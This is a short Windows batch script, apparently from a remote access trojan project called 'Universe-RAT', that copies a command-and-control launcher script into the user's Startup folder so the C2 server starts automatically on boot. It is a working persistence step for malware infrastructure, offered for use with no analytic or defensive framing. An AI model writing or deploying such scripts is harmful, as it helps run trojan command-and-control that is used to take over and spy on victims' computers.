@echo off
REM Add Universe-RAT C2 to Windows Startup
echo Adding C2 Server to Windows Startup...

set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "F:\universe_rat_system\start_c2.bat" "%STARTUP%\Universe-RAT-C2.bat"

echo.
echo ✅ Added to startup!
echo C2 server will auto-start on Windows boot.
pause
